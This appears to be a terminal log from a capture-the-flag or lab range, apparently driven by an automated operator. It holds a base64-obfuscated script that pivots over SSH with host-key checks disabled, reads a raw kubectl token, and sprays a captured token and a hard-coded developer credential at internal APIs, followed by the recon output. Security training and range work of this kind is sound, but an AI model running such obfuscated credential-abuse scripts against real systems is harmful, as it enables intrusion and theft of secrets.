@@ -1,0 +1,258 @@
+└─$ └─$ 
+
+┌──(cinder@kali)-[~]
+└─$ └─$ base64 -d > /tmp/k14_r18.sh <<'B64EOF'
+> c2V0ICtlCnNzaCAtbyBCYXRjaE1vZGU9eWVzIC1vIFN0cmljdEhvc3RLZXlDaGVja2luZz1ubyAtbyBDb25uZWN0VGltZW91dD04IHJvd2FuLWRldiAnYmFzaCAtcycgPDwnUlNIJwpzZXQgK2UKVz0iRkxBR3s2YmI2NjA3NGYyMzI1NDA1fSIKVzI9IkZMQUd7YWRmYmFiZGNkYWNhOThhY30iCkpXVD0kKGt1YmVjdGwgY29uZmlnIHZpZXcgLS1yYXcgLW8ganNvbnBhdGg9J3sudXNlcnNbMF0udXNlci50b2tlbn0nKQp0KCl7IGVjaG8gIi0tICQxIjsgc2hpZnQ7IGN1cmwgLXNTayAtbSA3IC1vIC90bXAvbyAtdyAnIFsle2h0dHBfY29kZX1dJyAiJEAiIDsgZWNobyAiIDo6ICQoaGVhZCAtYyA0MDAgL3RtcC9vIHwgdHIgJ1xuJyAnICcpIjsgfQplY2hvICI9PT0gSE9TVFMgRklMRSA9PT0iCmNhdCAvZXRjL2hvc3RzCmVjaG8gIj09PSBXT1JLU1BBQ0UgVE9LRU4gTUFUUklYIGFjcm9zcyBob3N0cyA9PT0iCmZvciBIIGluIGNsb3VkLWFwaSB3b3JrbG9hZHMgd29ya2xvYWQgZGF0YSBpZGVudGl0eSBpZDsgZG8KIGZvciBVIGluIC9hcGkvd29ya3NwYWNlcy9jdXJyZW50L3Rva2VuLWV4Y2hhbmdlIC9hcGkvd29ya3NwYWNlL2N1cnJlbnQvdG9rZW4tZXhjaGFuZ2UgL2FwaS90b2tlbi1leGNoYW5nZTsgZG8KICBlY2hvICIjIyMgJEgkVSIKICB0ICJHRVQgd3NoZWFkZXIiIC1IICJYLVdvcmtzcGFjZS1Ub2tlbjogJFciICJodHRwczovLyRILmtlcGxlcm9wcy50ZXN0JFUiCiAgdCAiUE9TVCB3c2hlYWRlciBib2R5IGFsbCIgLVggUE9TVCAtSCAiWC1Xb3Jrc3BhY2UtVG9rZW46ICRXIiAtSCAnQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9qc29uJyAtZCAie1wid29ya3NwYWNlX3Rva2VuXCI6XCIkV1wiLFwiZXhwb3J0X2lkXCI6XCJFWFAtMjg0MVwiLFwiaGFuZG92ZXJcIjpcIkVYUC0yODQxXCJ9IiAiaHR0cHM6Ly8kSC5rZXBsZXJvcHMudGVzdCRVIgogIHQgIlBPU1QgYmVhcmVyIiAtWCBQT1NUIC1IICJBdXRob3JpemF0aW9uOiBCZWFyZXIgJFciIC1IICdDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL2pzb24nIC1kICd7fScgImh0dHBzOi8vJEgua2VwbGVyb3BzLnRlc3QkVSIKICB0ICJQT1NUIGJhc2ljIiAtWCBQT1NUIC11ICJyb3dhbi5pdG86JFciIC1IICdDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL2pzb24nIC1kICd7fScgImh0dHBzOi8vJEgua2VwbGVyb3BzLnRlc3QkVSIKIGRvbmUKZG9uZQplY2hvICI9PT0gSURFTlRJVFkgUFJPQkVTID09PSIKZm9yIHAgaW4gLyAvYWRtaW4vIC9hcGkgL2FwaS9jb25maWcgL3JlYWxtcyAvYXV0aC9yZWFsbXMgL3JlYWxtcy9maWVsZGxpbmsgL3JlYWxtcy9maWVsZGxpbmsvLndlbGwta25vd24vb3BlbmlkLWNvbmZpZ3VyYXRpb24gLy53ZWxsLWtub3duL29wZW5pZC1jb25maWd1cmF0aW9uIC9wcm90b2NvbC9vcGVuaWQtY29ubmVjdC90b2tlbiAvYXV0aC9yZWFsbXMvZmllbGRsaW5rL3Byb3RvY29sL29wZW5pZC1jb25uZWN0L3Rva2VuIC9sb2dpbiAvYXBpL2F1dGggL2FwaS9zZXNzaW9uIC93aG9hbWkgL2FwaS93aG9hbWkgL2hlYWx0aCAvYXBpL2hlYWx0aDsgZG8KIHQgImlkJHAiICJodHRwczovL2lkZW50aXR5LmtlcGxlcm9wcy50ZXN0JHAiCmRvbmUKZWNobyAiPT09IElEID0gc2FtZSA9PT0iCnQgImlkIC9hZG1pbi8iICJodHRwczovL2lkLmtlcGxlcm9wcy50ZXN0L2FkbWluLyIKZWNobyAiPT09IEdJVEVBIE9SRyBSRVBPUyA9PT0iCkFQST0iaHR0cHM6Ly9zb3VyY2Uua2VwbGVyb3BzLnRlc3QvYXBpL3YxIgpBPSJyb3dhbi5pdG86ZmtfZGV2ZWxvcGVyX3lVV1RLU3FyYzE2eTNLNV81RGZRN3FhY2Z0OWItOXhvIgp0ICJvcmcgcmVwb3MiIC11ICIkQSIgIiRBUEkvb3Jncy9maWVsZGtlc3QvcmVwb3M/bGltaXQ9NTAiCnQgImFkbWluIHJlcG9zIiAtdSAiJEEiICIkQVBJL3JlcG9zL3NlYXJjaD9saW1pdD01MCZxPSIKdCAidXNlcnMiIC11ICIkQSIgIiRBUEkvdXNlcnMvc2VhcmNoP2xpbWl0PTIwIgplY2hvICI9PT0gT0JKRUNUUyBGVUxMIExJU1QgPT09IgpjdXJsIC1zU2sgLW0gMTAgImh0dHBzOi8vb2JqZWN0cy5rZXBsZXJvcHMudGVzdC9maWVsZGtlc3Qtd29ya3NwYWNlcy8/bGlzdC10eXBlPTIiIHwgdHIgJzwnICdcbjwnIHwgZ3JlcCAtRSAnXktleT58XlNpemU+JyB8IGhlYWQgLTYwClJTSAplY2hvIERPTkVfSzE0X1IxOAo=
+> B64EOF
+
+┌──(cinder@kali)-[~]
+└─$ └─$ chmod +x /tmp/k14_r18.sh; bash /tmp/k14_r18.sh; echo DONEMARK_1795201357926$((6*7))
+=== HOSTS FILE ===
+127.0.0.1	localhost
+::1	localhost ip6-localhost ip6-loopback
+fe00::	ip6-localnet
+ff00::	ip6-mcastprefix
+ff02::1	ip6-allnodes
+ff02::2	ip6-allrouters
+10.77.50.11	workload.keplerops.test
+10.77.50.11	objects.keplerops.test
+10.77.60.20	connector.arwc.test
+10.77.50.11	tickets.keplerops.test
+10.77.50.11	assistant.keplerops.test
+10.77.51.20	source-tools.keplerops.test
+10.77.50.11	staff.keplerops.test
+10.77.50.11	data.keplerops.test
+10.77.50.11	ca.keplerops.test
+10.77.51.41	review.keplerops.test
+10.77.51.70	indexer.keplerops.test
+10.77.50.11	workloads.keplerops.test
+10.77.50.11	id.keplerops.test
+10.77.50.11	support.keplerops.test
+10.77.50.11	llm.keplerops.test
+10.77.50.11	cert.keplerops.test
+10.77.50.40	kerberos.keplerops.test
+10.77.51.40	ci.keplerops.test
+10.77.51.30	packages.keplerops.test
+10.77.50.11	identity.keplerops.test
+10.77.50.11	cloud-api.keplerops.test
+10.77.51.50	preview.keplerops.test
+10.77.50.11	workboard.keplerops.test
+10.77.51.20	source.keplerops.test
+10.77.50.20	k-dev.keplerops.test k-dev
+10.77.55.2	k-dev.keplerops.test k-dev
+=== WORKSPACE TOKEN MATRIX across hosts ===
+### cloud-api/api/workspaces/current/token-exchange
+-- GET wsheader
+ [401] :: {"error":"authentication_required"} 
+-- POST wsheader body all
+ [401] :: {"error":"authentication_required"} 
+-- POST bearer
+ [401] :: {"error":"authentication_required"} 
+-- POST basic
+ [401] :: {"error":"authentication_required"} 
+### cloud-api/api/workspace/current/token-exchange
+-- GET wsheader
+ [401] :: {"error":"authentication_required"} 
+-- POST wsheader body all
+ [401] :: {"error":"authentication_required"} 
+-- POST bearer
+ [401] :: {"error":"authentication_required"} 
+-- POST basic
+ [401] :: {"error":"authentication_required"} 
+### cloud-api/api/token-exchange
+-- GET wsheader
+ [401] :: {"error":"authentication_required"} 
+-- POST wsheader body all
+ [401] :: {"error":"authentication_required"} 
+-- POST bearer
+ [401] :: {"error":"authentication_required"} 
+-- POST basic
+ [401] :: {"error":"authentication_required"} 
+### workloads/api/workspaces/current/token-exchange
+-- GET wsheader
+ [401] :: {"error":"authentication_required"} 
+-- POST wsheader body all
+ [401] :: {"error":"authentication_required"} 
+-- POST bearer
+ [401] :: {"error":"authentication_required"} 
+-- POST basic
+ [401] :: {"error":"authentication_required"} 
+### workloads/api/workspace/current/token-exchange
+-- GET wsheader
+ [401] :: {"error":"authentication_required"} 
+-- POST wsheader body all
+ [401] :: {"error":"authentication_required"} 
+-- POST bearer
+ [401] :: {"error":"authentication_required"} 
+-- POST basic
+ [401] :: {"error":"authentication_required"} 
+### workloads/api/token-exchange
+-- GET wsheader
+ [401] :: {"error":"authentication_required"} 
+-- POST wsheader body all
+ [401] :: {"error":"authentication_required"} 
+-- POST bearer
+ [401] :: {"error":"authentication_required"} 
+-- POST basic
+ [401] :: {"error":"authentication_required"} 
+### workload/api/workspaces/current/token-exchange
+-- GET wsheader
+ [401] :: {"error":"authentication_required"} 
+-- POST wsheader body all
+ [401] :: {"error":"authentication_required"} 
+-- POST bearer
+ [401] :: {"error":"authentication_required"} 
+-- POST basic
+ [401] :: {"error":"authentication_required"} 
+### workload/api/workspace/current/token-exchange
+-- GET wsheader
+ [401] :: {"error":"authentication_required"} 
+-- POST wsheader body all
+ [401] :: {"error":"authentication_required"} 
+-- POST bearer
+ [401] :: {"error":"authentication_required"} 
+-- POST basic
+ [401] :: {"error":"authentication_required"} 
+### workload/api/token-exchange
+-- GET wsheader
+ [401] :: {"error":"authentication_required"} 
+-- POST wsheader body all
+ [401] :: {"error":"authentication_required"} 
+-- POST bearer
+ [401] :: {"error":"authentication_required"} 
+-- POST basic
+ [401] :: {"error":"authentication_required"} 
+### data/api/workspaces/current/token-exchange
+-- GET wsheader
+ [404] :: <html> <head><title>404 Not Found</title></head> <body> <center><h1>404 Not Found</h1></center> <hr><center>nginx</center> </body> </html> 
+-- POST wsheader body all
+ [404] :: <html> <head><title>404 Not Found</title></head> <body> <center><h1>404 Not Found</h1></center> <hr><center>nginx</center> </body> </html> 
+-- POST bearer
+ [404] :: <html> <head><title>404 Not Found</title></head> <body> <center><h1>404 Not Found</h1></center> <hr><center>nginx</center> </body> </html> 
+-- POST basic
+ [404] :: <html> <head><title>404 Not Found</title></head> <body> <center><h1>404 Not Found</h1></center> <hr><center>nginx</center> </body> </html> 
+### data/api/workspace/current/token-exchange
+-- GET wsheader
+ [404] :: <html> <head><title>404 Not Found</title></head> <body> <center><h1>404 Not Found</h1></center> <hr><center>nginx</center> </body> </html> 
+-- POST wsheader body all
+ [404] :: <html> <head><title>404 Not Found</title></head> <body> <center><h1>404 Not Found</h1></center> <hr><center>nginx</center> </body> </html> 
+-- POST bearer
+ [404] :: <html> <head><title>404 Not Found</title></head> <body> <center><h1>404 Not Found</h1></center> <hr><center>nginx</center> </body> </html> 
+-- POST basic
+ [404] :: <html> <head><title>404 Not Found</title></head> <body> <center><h1>404 Not Found</h1></center> <hr><center>nginx</center> </body> </html> 
+### data/api/token-exchange
+-- GET wsheader
+ [404] :: <html> <head><title>404 Not Found</title></head> <body> <center><h1>404 Not Found</h1></center> <hr><center>nginx</center> </body> </html> 
+-- POST wsheader body all
+ [404] :: <html> <head><title>404 Not Found</title></head> <body> <center><h1>404 Not Found</h1></center> <hr><center>nginx</center> </body> </html> 
+-- POST bearer
+ [404] :: <html> <head><title>404 Not Found</title></head> <body> <center><h1>404 Not Found</h1></center> <hr><center>nginx</center> </body> </html> 
+-- POST basic
+ [404] :: <html> <head><title>404 Not Found</title></head> <body> <center><h1>404 Not Found</h1></center> <hr><center>nginx</center> </body> </html> 
+### identity/api/workspaces/current/token-exchange
+-- GET wsheader
+ [404] :: {"error":"Unable to find matching target resource method"}
+-- POST wsheader body all
+ [404] :: {"error":"Unable to find matching target resource method"}
+-- POST bearer
+ [404] :: {"error":"Unable to find matching target resource method"}
+-- POST basic
+ [404] :: {"error":"Unable to find matching target resource method"}
+### identity/api/workspace/current/token-exchange
+-- GET wsheader
+ [404] :: {"error":"Unable to find matching target resource method"}
+-- POST wsheader body all
+ [404] :: {"error":"Unable to find matching target resource method"}
+-- POST bearer
+ [404] :: {"error":"Unable to find matching target resource method"}
+-- POST basic
+ [404] :: {"error":"Unable to find matching target resource method"}
+### identity/api/token-exchange
+-- GET wsheader
+ [404] :: {"error":"Unable to find matching target resource method"}
+-- POST wsheader body all
+ [404] :: {"error":"Unable to find matching target resource method"}
+-- POST bearer
+ [404] :: {"error":"Unable to find matching target resource method"}
+-- POST basic
+ [404] :: {"error":"Unable to find matching target resource method"}
+### id/api/workspaces/current/token-exchange
+-- GET wsheader
+ [404] :: {"error":"Unable to find matching target resource method"}
+-- POST wsheader body all
+ [404] :: {"error":"Unable to find matching target resource method"}
+-- POST bearer
+ [404] :: {"error":"Unable to find matching target resource method"}
+-- POST basic
+ [404] :: {"error":"Unable to find matching target resource method"}
+### id/api/workspace/current/token-exchange
+-- GET wsheader
+ [404] :: {"error":"Unable to find matching target resource method"}
+-- POST wsheader body all
+ [404] :: {"error":"Unable to find matching target resource method"}
+-- POST bearer
+ [404] :: {"error":"Unable to find matching target resource method"}
+-- POST basic
+ [404] :: {"error":"Unable to find matching target resource method"}
+### id/api/token-exchange
+-- GET wsheader
+ [404] :: {"error":"Unable to find matching target resource method"}
+-- POST wsheader body all
+ [404] :: {"error":"Unable to find matching target resource method"}
+-- POST bearer
+ [404] :: {"error":"Unable to find matching target resource method"}
+-- POST basic
+ [404] :: {"error":"Unable to find matching target resource method"}
+=== IDENTITY PROBES ===
+-- id/
+ [302] :: 
+-- id/admin/
+ [302] :: 
+-- id/api
+ [404] :: {"error":"Unable to find matching target resource method"}
+-- id/api/config
+ [404] :: {"error":"Unable to find matching target resource method"}
+-- id/realms
+ [404] :: {"error":"Unable to find matching target resource method"}
+-- id/auth/realms
+ [404] :: {"error":"Unable to find matching target resource method"}
+-- id/realms/fieldlink
+ [404] :: {"error":"Realm does not exist"}
+-- id/realms/fieldlink/.well-known/openid-configuration
+ [404] :: {"error":"Realm does not exist"}
+-- id/.well-known/openid-configuration
+ [404] :: {"error":"Unable to find matching target resource method"}
+-- id/protocol/openid-connect/token
+ [404] :: {"error":"Unable to find matching target resource method"}
+-- id/auth/realms/fieldlink/protocol/openid-connect/token
+ [404] :: {"error":"Unable to find matching target resource method"}
+-- id/login
+ [404] :: {"error":"Unable to find matching target resource method"}
+-- id/api/auth
+ [404] :: {"error":"Unable to find matching target resource method"}
+-- id/api/session
+ [404] :: {"error":"Unable to find matching target resource method"}
+-- id/whoami
+ [404] :: {"error":"Unable to find matching target resource method"}
+-- id/api/whoami
+ [404] :: {"error":"Unable to find matching target resource method"}
+-- id/health
+ [404] :: {"error":"Unable to find matching target resource method"}
+-- id/api/health
+ [404] :: {"error":"Unable to find matching target resource method"}
+=== ID = same ===
+-- id /admin/
+ [302] :: 
+=== GITEA ORG REPOS ===
+-- org repos
+ [200] :: [{"id":1,"owner":{"id":3,"login":"fieldkest","login_name":"","source_id":0,"full_name":"","email":"","avatar_url":"https://source.keplerops.test/avatars/77d0fb46d842ebf42b8c560b28b44a0a","html_url":"https://source.keplerops.test/fieldkest","language":"","is_admin":false,"last_login":"0001-01-01T00:00:00Z","created":"2026-11-19T07:07:33Z","restricted":false,"active":false,"prohibit_login":false,"lo
+-- admin repos
+ [200] :: {"ok":true,"data":[{"id":3,"owner":{"id":3,"login":"fieldkest","login_name":"","source_id":0,"full_name":"","email":"","avatar_url":"https://source.keplerops.test/avatars/77d0fb46d842ebf42b8c560b28b44a0a","html_url":"https://source.keplerops.test/fieldkest","language":"","is_admin":false,"last_login":"0001-01-01T00:00:00Z","created":"2026-11-19T07:07:33Z","restricted":false,"active":false,"prohibi
+-- users
+ [200] :: {"data":[{"id":1,"login":"fieldlink-bootstrap","login_name":"","source_id":0,"full_name":"","email":"source-admin@fieldkest.test","avatar_url":"https://source.keplerops.test/avatars/7bfc283fbc08e22eeb3a3af1326c544c","html_url":"https://source.keplerops.test/fieldlink-bootstrap","language":"","is_admin":false,"last_login":"0001-01-01T00:00:00Z","created":"2026-11-19T07:07:33Z","restricted":false,"a
+=== OBJECTS FULL LIST ===
+Key>exports/EXP-2841/handover.json
+Size>251
+Key>notebooks/deploy-2026-09.json
+Size>402
+DONE_K14_R18
